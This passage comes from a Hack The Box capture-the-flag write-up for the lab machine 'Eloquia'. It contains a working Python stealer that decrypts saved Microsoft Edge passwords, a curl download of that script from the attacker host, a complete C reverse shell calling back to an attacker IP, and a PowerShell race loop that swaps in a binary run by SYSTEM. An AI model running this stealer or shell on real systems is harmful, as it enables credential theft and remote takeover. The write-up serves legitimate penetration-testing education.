+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># decrypt_edge_modern.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> win32crypt</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Get encryption key from Edge &quot;Local State&quot;</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">local_state_path = (</span><br><span class="line">    <span class="string">r&quot;C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Local State&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(local_state_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    local_state = json.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode and decrypt the encryption key</span></span><br><span class="line">encryption_key = base64.b64decode(</span><br><span class="line">    local_state[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove DPAPI prefix</span></span><br><span class="line">encryption_key = encryption_key[<span class="number">5</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt key using DPAPI</span></span><br><span class="line">encryption_key = win32crypt.CryptUnprotectData(</span><br><span class="line">    encryption_key, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span></span><br><span class="line">)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Copy and open the Edge login database</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">src = (</span><br><span class="line">    <span class="string">r&quot;C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default\Login Data&quot;</span></span><br><span class="line">)</span><br><span class="line">dst = <span class="string">r&quot;C:\Windows\Temp\login_tmp.db&quot;</span></span><br><span class="line"></span><br><span class="line">shutil.copy2(src, dst)</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(dst)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">cursor.execute(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    SELECT origin_url, username_value, password_value</span></span><br><span class="line"><span class="string">    FROM logins</span></span><br><span class="line"><span class="string">    WHERE username_value != &#x27;&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Decrypt stored credentials</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> url, username, enc_pwd <span class="keyword">in</span> cursor.fetchall():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Modern Edge uses AES-GCM with &#x27;v10&#x27; prefix</span></span><br><span class="line">        <span class="keyword">if</span> enc_pwd[:<span class="number">3</span>] == <span class="string">b&quot;v10&quot;</span>:</span><br><span class="line">            nonce = enc_pwd[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">            ciphertext = enc_pwd[<span class="number">15</span>:]</span><br><span class="line"></span><br><span class="line">            cipher = AES.new(encryption_key, AES.MODE_GCM, nonce)</span><br><span class="line">            password = cipher.decrypt(ciphertext)[:-<span class="number">16</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Fallback to legacy DPAPI</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password = win32crypt.CryptUnprotectData(</span><br><span class="line">                enc_pwd, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span></span><br><span class="line">            )[<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>|<span class="subst">&#123;username&#125;</span>|<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>|<span class="subst">&#123;username&#125;</span>|ERROR: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Cleanup</span></span><br><span class="line"><span class="comment"># ------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line">os.remove(dst)</span><br></pre></td></tr></table></figure></div>
+
+<p>Two details that make the difference between this working and silently failing: we <strong>copy</strong> the database to <code>C:\Windows\Temp</code> before opening it, because Edge holds a lock on the live file, and we strip the trailing 16 bytes of the plaintext because that’s the GCM authentication tag, not password material.</p>
+<p>Host it over HTTP, pull it down, and run it:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Python311&gt;curl http://10.10.16.79/decryptor.py -o /users/public/decryptor.py</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  2309  100  2309    0     0   4465      0 --:--:-- --:--:-- --:--:--  4457</span><br><span class="line"></span><br><span class="line">C:\Program Files\Python311&gt;python.exe /users/public/decryptor.py</span><br><span class="line">https://openai.com/|olivia.kat|ERROR: &#x27;utf-8&#x27; codec can&#x27;t decode byte 0xb2 in position 4: invalid start byte</span><br><span class="line">http://eloquia.htb/accounts/login/|Olivia.KAT|S3cureP@sswdIGu3ss</span><br><span class="line">https://eloquia.htb/|test|testtest1234!</span><br><span class="line">https://chatgpt.com/|olivia.kat|S3cureP@sswd3Openai</span><br></pre></td></tr></table></figure></div>
+
+<p>Four entries, two of them real:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">olivia.kat:S3cureP@sswdIGu3ss</span><br><span class="line">olivia.kat:S3cureP@sswd3Openai</span><br></pre></td></tr></table></figure></div>
+
+<p>(The <code>openai.com</code> row fails to decode because that blob is a different record type, not because our key is wrong — the two rows either side of it decrypt perfectly with the same key, which is all the confirmation we need.)</p>
+<p>Those are web-app passwords saved in a browser, not Windows credentials. The bet we’re making is the oldest one in the book: that <code>olivia.kat</code> typed the same password into the Eloquia login form and into her Windows account. Remember port <code>5985</code> has been sitting open since the nmap scan.</p>
+<h2 id="User-Flag-WinRM-as-olivia-kat"><a href="#User-Flag-WinRM-as-olivia-kat" class="headerlink" title="User Flag - WinRM as olivia.kat"></a>User Flag - WinRM as olivia.kat</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i eloquia.htb -u olivia.kat -p <span class="string">&quot;S3cureP@sswdIGu3ss&quot;</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class="string">&#x27; for module Reline</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Info: Establishing connection to remote endpoint</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents&gt; whoami</span></span><br><span class="line"><span class="string">eloquia\olivia.kat</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Password reuse, exactly as advertised. Grab the flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents&gt; <span class="built_in">type</span> ..\Desktop\user.txt</span><br><span class="line">&lt;user flag&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+<h2 id="Privilege-Escalation-Racing-the-Failure2Ban-Build"><a href="#Privilege-Escalation-Racing-the-Failure2Ban-Build" class="headerlink" title="Privilege Escalation - Racing the Failure2Ban Build"></a>Privilege Escalation - Racing the Failure2Ban Build</h2><p>Enumerating as <code>olivia.kat</code>, the thing that doesn’t belong is in <code>C:\Program Files</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files\Qooqle IPS Software&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Qooqle IPS Software</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        4/30/2024   1:44 PM                Failure2Ban - Prototype</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Qooqle IPS Software&gt; <span class="built_in">cd</span> <span class="string">&quot;Failure2Ban - Prototype&quot;</span></span><br><span class="line">*Evil-WinRM* PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         5/1/2024   8:53 PM                Failure2Ban</span><br><span class="line">-a----        4/23/2024   5:18 AM            923 Failure2Ban.sln</span><br><span class="line">-a----        4/30/2024  12:55 AM          56832 Failure2Ban.v11.suo</span><br></pre></td></tr></table></figure></div>
+
+<p>A <code>.sln</code> and a <code>.suo</code> — this is not a deployed application, it’s a <strong>Visual Studio solution directory</strong> that somebody left in <code>Program Files</code>. Reading the project source tells us what it does: it’s a Windows Service that wakes up every 30 seconds, scans a login log for failed authentication attempts, and after ten failures from one IP creates a Windows Firewall rule to block it. A Fail2Ban clone for Windows, running as SYSTEM.</p>
+<p>The interesting part isn’t the code. It’s the directory layout. Builds go to <code>Failure2Ban\bin\debug\Failure2Ban.exe</code>, and on this box something is rebuilding and re-running that project on a loop. Which hands us the classic Visual Studio escalation: <strong>the build output path is writable by us, and the thing that executes it is SYSTEM.</strong> We don’t need to find a bug in the service at all. We just need our file to be the one sitting at <code>bin\debug\Failure2Ban.exe</code> when SYSTEM goes to run it.</p>
+<p>It’s a race, though, and a genuine one — during the build the file is locked, and immediately after the build it gets executed. The window where it’s written but not yet running is small and we don’t control when it opens.</p>
+<p>First, a payload. Same idea as the SQLite DLL but as a standalone EXE, with one important addition:</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ cat rev.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLIENT_IP   <span class="string">&quot;10.10.16.79&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLIENT_PORT 4444</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET sockt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">    STARTUPINFOA sinfo;</span><br><span class="line">    PROCESS_INFORMATION pinfo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize Winsock */</span></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create socket */</span></span><br><span class="line">    sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sockt == INVALID_SOCKET) &#123;</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Setup target address */</span></span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    sa.sin_port   = htons(CLIENT_PORT);</span><br><span class="line">    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Retry connection until successful */</span></span><br><span class="line">    <span class="keyword">while</span> (connect(sockt, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa)) == SOCKET_ERROR) &#123;</span><br><span class="line">        Sleep(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Setup process startup info */</span></span><br><span class="line">    ZeroMemory(&amp;sinfo, <span class="keyword">sizeof</span>(sinfo));</span><br><span class="line">    sinfo.cb = <span class="keyword">sizeof</span>(sinfo);</span><br><span class="line">    sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;</span><br><span class="line">    sinfo.wShowWindow = SW_HIDE;</span><br><span class="line">    sinfo.hStdInput  = (HANDLE)sockt;</span><br><span class="line">    sinfo.hStdOutput = (HANDLE)sockt;</span><br><span class="line">    sinfo.hStdError  = (HANDLE)sockt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Launch command shell */</span></span><br><span class="line">    <span class="type">char</span> cmd[] = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (CreateProcessA(</span><br><span class="line">            <span class="literal">NULL</span>, cmd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE,</span><br><span class="line">            CREATE_NO_WINDOW, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">            &amp;sinfo, &amp;pinfo</span><br><span class="line">        )) &#123;</span><br><span class="line">        WaitForSingleObject(pinfo.hProcess, INFINITE);</span><br><span class="line">        CloseHandle(pinfo.hProcess);</span><br><span class="line">        CloseHandle(pinfo.hThread);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(sockt);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>The addition is the retry loop around <code>connect()</code>. Because we don’t know <em>when</em> SYSTEM will execute our binary, a one-shot connect that fires before the listener is up just dies silently and we’ve burned the overwrite. Retrying every five seconds forever means the payload can sit there patiently for as long as it takes.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ x86_64-w64-mingw32-gcc rev.c -o rev.exe -lws2_32 -mwindows -s -Wl,--strip-all</span><br></pre></td></tr></table></figure></div>
+
+<p><code>-mwindows</code> builds it as a GUI subsystem binary so no console window flashes up, and <code>-s -Wl,--strip-all</code> keeps it small.</p>
+<p>Upload <code>rev.exe</code> to <code>olivia.kat</code>‘s Documents with evil-winrm’s <code>upload</code>, then run the race from the build output directory. The loop is deliberately as tight as PowerShell will go — no sleep, no logging, nothing between attempts. It spins, failing with a file-lock exception every iteration, until the instant the lock drops:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\debug&gt; <span class="keyword">while</span> (<span class="variable">$true</span>) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        Copy-Item <span class="string">&quot;/users/olivia.kat/documents/rev.exe&quot;</span> <span class="string">&quot;./Failure2Ban.exe&quot;</span> -Force -ErrorAction Stop</span><br><span class="line">        Write-Host <span class="string">&quot;[+] Overwrite successful&quot;</span></span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    &#125; catch &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[+] Overwrite successful</span><br></pre></td></tr></table></figure></div>
+
+<p><code>-ErrorAction Stop</code> is what makes this work: <code>Copy-Item</code>‘s sharing violation is a non-terminating error by default, so without it the <code>catch</code> never fires and the loop can’t tell success from failure. The empty <code>catch</code> block is the whole point — we expect to fail hundreds of times and we only care about the one time we don’t.</p>
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>Listener on 4444, and we wait for the next build-and-run cycle:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ rlwrap nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.79] from (UNKNOWN) [10.129.3.210] 51212</span><br><span class="line">Microsoft Windows [Version 10.0.17763.8027]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">cd</span> /users/administrator/desktop</span><br><span class="line"><span class="built_in">cd</span> /users/administrator/desktop</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;<span class="built_in">type</span> root.txt</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br><span class="line">a2d3e758f8df22d7719d86d376824236</span><br></pre></td></tr></table></figure></div>
+
+<p><code>nt authority\system</code>, and the service even dropped us into <code>C:\Windows\system32</code> for free.</p>
+<h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Vulnerability</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>OAuth2 account linking</td>
+<td>Callback is a cookie-authenticated GET with no <code>state</code> parameter</td>
+<td>Account-link CSRF</td>
+</tr>
+<tr>
+<td>AngularJS ngSanitize</td>
+<td>CVE-2025-2336 — <code>xlink:href</code> on SVG <code>&lt;image&gt;</code> survives sanitisation</td>
+<td>Forced authenticated GET from the admin bot</td>
+</tr>
+<tr>
+<td>Admin panel</td>
+<td>Saved queries run raw SQLite with extension loading enabled</td>
+<td><code>load_extension()</code> on an uploaded DLL &#x3D; RCE as <code>eloquia\web</code></td>
+</tr>
+<tr>
+<td>File upload</td>
+<td>Banner handler accepts any file type into a known web path</td>
+<td>Somewhere to put the DLL</td>
+</tr>
+<tr>
+<td>Microsoft Edge</td>
+<td>Saved passwords recoverable in-context via DPAPI key + AES-GCM</td>
+<td><code>olivia.kat</code> credentials</td>
+</tr>
+<tr>
+<td>Credential hygiene</td>
+<td>Web-app password reused as the Windows account password</td>
+<td>WinRM as <code>olivia.kat</code></td>
+</tr>
+<tr>
+<td>Visual Studio project</td>
+<td>Build output in a user-writable path, executed by a SYSTEM service</td>
+<td>Race-condition overwrite → SYSTEM</td>
+</tr>
+</tbody></table>
+<p>The one I’d actually take away from this box is the first one, because it’s the step people are most likely to under-rate when they meet it in the wild. We had an XSS that couldn’t run script. On a normal target you’d write that up as “low — forced request, no script execution” and move on. Here it was game over for the admin account, and the reason is that the application’s <em>authentication</em> flow was reachable by exactly the primitive our <em>injection</em> bug produced. The severity of a bug is never a property of the bug on its own; it’s a property of what happens to sit next to it.</p>
+<p>And the thing that makes the OAuth link exploitable isn’t exotic either. It’s one absent parameter. <code>state</code> exists for precisely this — binding the callback to the session that initiated the flow — and when it’s missing, “which account approved this” and “which account gets linked” stop being the same question. Any time you see an OAuth callback that’s a bare GET with no <code>state</code>, that’s the first thing to try.</p>
+<p>Then there’s the honourable mention: a <code>.sln</code> file in <code>C:\Program Files</code>. Nobody intends to ship a Visual Studio solution to production, but when it happens, <code>bin\debug\</code> is a file path an unprivileged user can write to and a privileged process will execute. That’s not even an exploit, it’s just the build system doing its job on behalf of the wrong person.</p>
+<p>That was it for Eloquia, hope you learned something new!</p>
+<ul>
+<li>0xkujen</li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Eloquia</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-10-16 19:10:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-10-17 01:00:34
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/10/16/Hackthebox-Eloquia/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/hackthebox/">#hackthebox</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/AngularJS/">#AngularJS</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/ngSanitize/">#ngSanitize</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/CVE-2025-2336/">#CVE-2025-2336</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/XSS/">#XSS</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/OAuth2/">#OAuth2</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Account-Takeover/">#Account Takeover</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/SQLite/">#SQLite</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/load-extension/">#load_extension</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/DLL/">#DLL</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/IIS/">#IIS</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Microsoft-Edge/">#Microsoft Edge</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/DPAPI/">#DPAPI</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/AES-GCM/">#AES-GCM</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
